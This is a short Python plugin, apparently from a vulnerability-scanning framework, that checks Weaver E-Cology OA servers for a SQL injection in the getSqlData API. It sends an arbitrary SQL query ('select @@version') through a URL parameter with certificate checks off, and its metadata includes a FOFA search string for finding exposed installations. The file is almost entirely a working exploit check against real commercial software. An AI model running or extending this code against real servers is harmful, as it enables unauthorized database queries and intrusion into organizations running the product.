#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/TZZ8p8T4S_O8eJa4qlui_g',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '泛微OA E Cology getSqlData SQL注入',

      'level'     :   'high',
      
      'FOFA'      :   'app="泛微-E-Weaver"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'api_status.*?data.*?message.*?status.*?',res.text,re.S):
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret